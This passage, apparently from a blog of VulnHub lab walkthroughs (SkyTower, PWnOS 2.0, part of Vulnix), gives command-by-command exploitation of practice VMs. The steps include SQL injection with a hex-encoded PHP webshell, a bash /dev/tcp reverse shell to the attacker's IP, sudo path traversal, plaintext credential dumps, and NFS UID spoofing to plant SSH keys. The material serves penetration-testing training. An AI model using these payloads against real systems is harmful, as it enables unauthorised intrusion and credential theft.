</code></pre></div></div>

<p>Retrieving the records from the table login.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> root <span class="nt">-proot</span> <span class="nt">-e</span> <span class="s2">"use SkyTech; select * from login"</span>
<span class="nb">id      </span>email   password
1       john@skytech.com        hereisjohn
2       sara@skytech.com        ihatethisjob
3       william@skytech.com     senseable
</code></pre></div></div>

<p>We have the password for the users in plain text, so we login via SSH as user sara.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>proxychains ssh sara@192.168.179.175 /bin/bash           
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf                       
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4          
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14                                     
<span class="o">[</span>proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
sara@192.168.179.175<span class="s1">'s password:                                
id                                                             
uid=1001(sara) gid=1001(sara) groups=1001(sara)
</span></code></pre></div></div>

<p>As we see we don’t have an interactive shell, that’s annoying, if we check the last three lines of the .bashrc file, that’s what interrupts that we can access the system and have a shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail</span> <span class="nt">-n</span> 3 .bashrc
<span class="nb">echo
echo</span>  <span class="s2">"Funds have been withdrawn"</span>
<span class="nb">exit</span>
</code></pre></div></div>

<p>We can remove the last three lines from the .bashrc file and get a TTY shell, as follows:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv</span> .bashrc bashrc   
<span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'1,111p'</span> bashrc <span class="o">&gt;</span> .bashrc
script <span class="nt">-qc</span> /bin/bash /dev/null
sara@SkyTower:~<span class="nv">$ </span><span class="nb">id  
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sara<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sara<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>sara<span class="o">)</span>
</code></pre></div></div>

<p>The user sara is allowed to execute the cat and ls commands as sudo in the directory /accounts/, we will take advantage of this to get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sara@SkyTower:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>sara on this host:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User sara may run the following commands on this host:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/cat /accounts/<span class="k">*</span>, <span class="o">(</span>root<span class="o">)</span> /bin/ls /accounts/<span class="k">*</span>
</code></pre></div></div>

<p>Using sudo we can list the /root directory and read the flag that contains the password for the user root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sara@SkyTower:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/ls /accounts/../root
flag.txt
sara@SkyTower:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
</code></pre></div></div>

<p>Finally we login via SSH as user root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>proxychains ssh root@192.168.179.175 <span class="s1">'/bin/bash -i'</span>
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14
<span class="o">[</span>proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
root@192.168.179.175<span class="s1">'s password: 
bash: cannot set terminal process group (-1): Invalid argument
bash: no job control in this shell
root@SkyTower:~# id
id
uid=0(root) gid=0(root) groups=0(root)  
</span></code></pre></div></div>

  
    <h1 class="post-title">VulnHub - PWnOS 2.0</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is a Virutal Machine Image which hosts a server to pratice penetration testing. It will test your ability to exploit the server and contains multiple entry points to reach the goal.</p>

<p><strong>Author:</strong> pWnOS</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">https://www.vulnhub.com/entry/pwnos-20-pre-release,34/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>The virtual machine has an static IP address set up, so we must assign an IP in the same addressing range, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ip addr add 10.10.10.200/24 dev vmnet1
</code></pre></div></div>

<p>An scan with arp-scan allowed us to detect the address of our target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 10.10.10.0/24                                                   
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
10.10.10.100    00:0c:29:a3:96:fa       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan with nmap discovered two open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 10.10.10.100 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Service detection and script scanning were performed against the target machine in orer to detect more information about open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80 <span class="nt">-n</span> <span class="nt">-v</span> 10.10.10.100 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff <span class="o">(</span>DSA<span class="o">)</span>
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 <span class="o">(</span>RSA<span class="o">)</span>
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e <span class="o">(</span>ECDSA<span class="o">)</span>
80/tcp open  http    Apache httpd 2.2.17 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not <span class="nb">set</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.17 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to this Site!
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>The web service contains a simple web page with a welcome message.</p>

<p><img src="/assets/images/pwnos2/screenshot-1.png" alt="" /></p>

<p>Running dirsearch allowed other web resources to be discovered.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://10.10.10.100/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
...
<span class="o">[</span>18:41:40] Starting: 
<span class="o">[</span>18:41:41] 301 -  311B  - /blog  -&gt;  http://10.10.10.100/blog/
<span class="o">[</span>18:41:41] 200 -    1KB - /login
<span class="o">[</span>18:41:41] 200 -    2KB - /register
<span class="o">[</span>18:41:41] 200 -   50KB - /info
<span class="o">[</span>18:41:44] 200 -  854B  - /index
<span class="o">[</span>18:41:45] 301 -  315B  - /includes  -&gt;  http://10.10.10.100/includes/
<span class="o">[</span>18:42:32] 302 -    0B  - /activate  -&gt;  http://10.10.10.100/index.php
<span class="o">[</span>18:53:38] 403 -  293B  - /server-status
</code></pre></div></div>

<p>In the web page, a form login is vulnerable to SQL Injection, so the login was bypassed.</p>

<p><img src="/assets/images/pwnos2/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/pwnos2/screenshot-3.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="mysql-write-privileges">Mysql write privileges</h3>

<p>Another interesting way is to try to write content on the server taking advantage of the SQL Injection vulnerability, the following request tries to dump all users of the database and write them to a file called dump in the includes directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or 1=1 into outfile '</span>/var/www/includes/dump<span class="s1">'-- -
</span></code></pre></div></div>

<p><img src="/assets/images/pwnos2/screenshot-4.png" alt="" /></p>

<p>As we can see the file was written, showing us the only registered user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://10.10.10.100/includes/dump                            
1       Dan     Privett admin@isints.com        c2c4b4e51d9e23c02c15702c136c3e950ba9a4af        0       <span class="se">\N</span>      2011-05-07 17:27:01
</code></pre></div></div>

<p>Now we will try to write a webshell on the server, for that we need to know the column numbers.</p>

<p>First we must intercept the login request and send it to <strong>Intruder</strong>, we choose the attack type “sniper”, and highlight the parameter to test.</p>

<p><img src="/assets/images/pwnos2/screenshot-5.png" alt="" /></p>

<p>Set the payload type to “Numbers”, in <strong>Payload Options</strong> we choose numbers from 1 to 10, as shown in the following screenshot.</p>

<p><img src="/assets/images/pwnos2/screenshot-6.png" alt="" /></p>

<p>Then, click on <strong>Start Attack</strong>, as we can see in the following image there are 8 columns.</p>

<p><img src="/assets/images/pwnos2/screenshot-7.png" alt="" /></p>

<p>When trying to enumerate the ninth column the server responds with an error.</p>

<p><img src="/assets/images/pwnos2/screenshot-8.png" alt="" /></p>

<p>Then, we hex encode the webshell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"&lt;?php passthru(</span><span class="se">\$</span><span class="s2">_GET['cmd']); ?&gt;"</span> | xxd <span class="nt">-ps</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="p">;</span> <span class="nb">echo
</span>3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e
</code></pre></div></div>

<p>We use the following SQL statement to write it to the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e,0x20,0x20,0x20,0x20,0x20,0x20,0x20 into outfile '</span>/var/www/includes/z.php<span class="s1">'-- -
</span></code></pre></div></div>

<p><img src="/assets/images/pwnos2/screenshot-9.png" alt="" /></p>

<p>Now we can execute system comands.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.100/includes/z.php?cmd=id"</span>
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>We set up a netcat listener, and run the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.100/includes/z.php?cmd=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.200/443 0&gt;&amp;1"'</span><span class="si">)</span><span class="s2">"</span>
</code></pre></div></div>

<p>We got a shell as user www-data, and we upgrade it to a TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.10.200] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.100] 52171
bash: no job control <span class="k">in </span>this shell
www-data@web:/var/www/includes<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
www-data@web:/var/www/includes<span class="err">$</span>
</code></pre></div></div>

<p>Listing the web server, in the directory /var I found a MySQL connection file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@web:/var<span class="nv">$ </span><span class="nb">cat </span>mysqli_connect.php
...
DEFINE <span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>
DEFINE <span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'root@ISIntS'</span><span class="o">)</span><span class="p">;</span>
DEFINE <span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
DEFINE <span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'ch16'</span><span class="o">)</span><span class="p">;</span>
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="credential-disclosure">Credential Disclosure</h3>

<p>We switch to user root entering the password to connect to MySQL.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@web:/var<span class="nv">$ </span>su -
su -
Password: root@ISIntS

root@web:~#id
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<p>Also we can access via SSH, since root login is anabled in the SSH configuration file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@web:/var<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'permitrootlogin'</span> /etc/ssh/sshd_config
<span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'permitrootlogin'</span> /etc/ssh/sshd_config
PermitRootLogin <span class="nb">yes</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh root@10.10.10.100
root@10.10.10.100<span class="s1">'s password: 
root@web:~# id
uid=0(root) gid=0(root) groups=0(root)
</span></code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Vulnix</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> A vulnerable host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!).</p>

<p><strong>Author:</strong> Reboot User</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the only flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">https://www.vulnhub.com/entry/hacklab-vulnix,48/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan detected the target machine, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.174 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP/UDP port scan with unicornscan discovered many ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.174 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.174 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
...
listener statistics 386102 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.174  ttl 64 
TCP open                    smtp[   25]         from 192.168.179.174  ttl 64 
TCP open                  finger[   79]         from 192.168.179.174  ttl 64 
TCP open                    pop3[  110]         from 192.168.179.174  ttl 64 
TCP open                  sunrpc[  111]         from 192.168.179.174  ttl 64 
TCP open                    imap[  143]         from 192.168.179.174  ttl 64 
TCP open                    <span class="nb">exec</span><span class="o">[</span>  512]         from 192.168.179.174  ttl 64 
TCP open                   login[  513]         from 192.168.179.174  ttl 64 
TCP open                   shell[  514]         from 192.168.179.174  ttl 64 
TCP open                   imaps[  993]         from 192.168.179.174  ttl 64 
TCP open                   pop3s[  995]         from 192.168.179.174  ttl 64 
TCP open                   shilp[ 2049]         from 192.168.179.174  ttl 64 
TCP open                 unknown[33047]         from 192.168.179.174  ttl 64 
TCP open                 unknown[33733]         from 192.168.179.174  ttl 64 
TCP open                 unknown[45911]         from 192.168.179.174  ttl 64 
TCP open                 unknown[48148]         from 192.168.179.174  ttl 64 
TCP open                 unknown[55223]         from 192.168.179.174  ttl 64
...
listener statistics 12 packets recieved 0 packets droped and 0 interface drops
UDP open                  sunrpc[  111]         from 192.168.179.174  ttl 64 
UDP open                   shilp[ 2049]         from 192.168.179.174  ttl 64 
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>An aggressive scan with nmap, that includes service and OS detection, script scanning and traceroute were performed in order to get more information about the target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,25,79,110,111,143,512,513,514,993,995,2049,33047,33733,45911,48148,55223 192.168.179.174 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf <span class="o">(</span>DSA<span class="o">)</span>
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a <span class="o">(</span>RSA<span class="o">)</span>
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f <span class="o">(</span>ECDSA<span class="o">)</span>
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: 2021-12-05T08:32:18+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.<span class="se">\x</span>0D
110/tcp   open  pop3       Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING CAPA SASL RESP-CODES STLS UIDL
|_ssl-date: 2021-12-05T08:32:14+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
111/tcp   open  rpcbind    2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      42464/udp6  mountd
|   100005  1,2,3      46790/udp   mountd
|   100005  1,2,3      48148/tcp   mountd
|   100005  1,2,3      60796/tcp6  mountd
|   100021  1,3,4      33047/tcp   nlockmgr
|   100021  1,3,4      35625/tcp6  nlockmgr
|   100021  1,3,4      50485/udp   nlockmgr
|   100021  1,3,4      56578/udp6  nlockmgr
|   100024  1          33733/tcp   status
|   100024  1          40515/tcp6  status
|   100024  1          44348/udp   status
|   100024  1          46963/udp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_imap-capabilities: LITERAL+ IMAP4rev1 ID have more SASL-IR listed post-login Pre-login LOGIN-REFERRALS capabilities ENABLE OK LOGINDISABLEDA0001 IDLE STARTTLS
|_ssl-date: 2021-12-05T08:32:13+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
512/tcp   open  <span class="nb">exec       </span>netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  shell      Netkit rshd
993/tcp   open  ssl/imaps?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
| Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
|_SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
|_ssl-date: 2021-12-05T08:32:14+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
995/tcp   open  ssl/pop3s?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
| Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
|_SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
|_ssl-date: 2021-12-05T08:32:14+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
2049/tcp  open  nfs_acl    2-3 <span class="o">(</span>RPC <span class="c">#100227)</span>
33047/tcp open  nlockmgr   1-4 <span class="o">(</span>RPC <span class="c">#100021)</span>
33733/tcp open  status     1 <span class="o">(</span>RPC <span class="c">#100024)</span>
45911/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
48148/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
55223/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
</code></pre></div></div>

<h3 id="nfs-enumeration">NFS Enumeration</h3>

<p>By listing the NFS service the vulnix home directory was discovered.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>showmount <span class="nt">-e</span> 192.168.179.174
Export list <span class="k">for </span>192.168.179.174:
/home/vulnix <span class="k">*</span>
</code></pre></div></div>

<p>We mount this resource to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>2 192.168.179.174:/home/vulnix /mnt/nfs <span class="nt">-o</span> nolock

root@kali:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /mnt/nfs 
<span class="nb">ls</span>: reading directory <span class="s1">'/mnt/nfs'</span>: Permission denied
total 0
</code></pre></div></div>

<p>We don’t have permissions to access this directory, so we create a new user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>useradd <span class="nt">-u</span> 2008 vulnix <span class="nt">-s</span> /bin/bash
root@kali:~<span class="nv">$ </span>su vulnix
vulnix@kali:/root/vulnix<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span>
vulnix@kali:/root/vulnix<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /mnt/nfs/
total 20
drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 <span class="nb">.</span>
drwxr-xr-x 8 root   root   4096 Oct 12 07:05 ..
<span class="nt">-rw-r--r--</span> 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
<span class="nt">-rw-r--r--</span> 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
<span class="nt">-rw-r--r--</span> 1 vulnix vulnix  675 Apr  3  2012 .profile
</code></pre></div></div>

<p>Now we can access to the mounted directory, therefore we generate an SSH key pair.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s2">"vuln1x"</span> <span class="nt">-f</span> rev
</code></pre></div></div>

<p>We create the directory.ssh and inside it we create the authorized_key file with the public key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vulnix@kali:/root/vulnix<span class="nv">$ </span><span class="nb">mkdir</span> /mnt/nfs/.ssh
vulnix@kali:/root/vulnix<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyUpW9I3kgSpB8/LFNUQjCn5WifIZn0HKKULEGRuN0LPUwXGbdKLEkDr4HYdWP7eJ2eaaSmT/FU0K2G/Y9hUoDFN+FF7B86lx0SQ6Fiw4YZYb2ci3fLBK7Y9aTccTyDkQHgw2MptO046RB7KTaI3FixjhVBlbFzWaMLuiuBLK0ro26MqceHWqM+u1rG0PJFnp/2as6d7EOyFM3164R0xlQjNZMMHbpS6q6NKeyqVisE7wEMureRtokCkiykW+IbpkNUDndI2DFWMGF6XnvJuy6vxPwAIHodAGChSm2skuvO4am+UGTwrQZ/N4ylfcDzsuDIhiUI1nwD53lPs+vnsyCire9VRWoOp32ME+SGQVElkxM48xKPumemeDpV5UOC9Un4t/zoIs+cOWHcTtSI2MRj/KnXXzs22yv7eQPyxnDKj4VT/ld/41xaItUpE+RYF9Xn+nWTmbTZbfW5sGwnSosvlR1Ur+xcikaRs5gD9ytCl5d9iBeBSVgfWhczPbZ/p0='</span> <span class="o">&gt;</span> /mnt/nfs/.ssh/authorized_keys
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>We login via SSH as user vulnix using the private key generated.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> vulnix 192.168.179.174 <span class="nt">-i</span> rev 
Enter passphrase <span class="k">for </span>key <span class="s1">'rev'</span>: 
vulnix@vulnix:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span>
</code></pre></div></div>

<p>With sudo permissions we can edit the /etc/exports file and get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vulnix@vulnix:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching <span class="s1">'Defaults'</span> entries <span class="k">for </span>vulnix on this host:
    env_reset, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User vulnix may run the following commands on this host:
    <span class="o">(</span>root<span class="o">)</span> sudoedit /etc/exports, <span class="o">(</span>root<span class="o">)</span> NOPASSWD: sudoedit /etc/exports
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>The /etc/exports file indicates all directories that a server exports to its clients.</p>

<p>We add the following configuration specifying the directory /etc to export, allowing the root user to access the NFS server as root.</p>

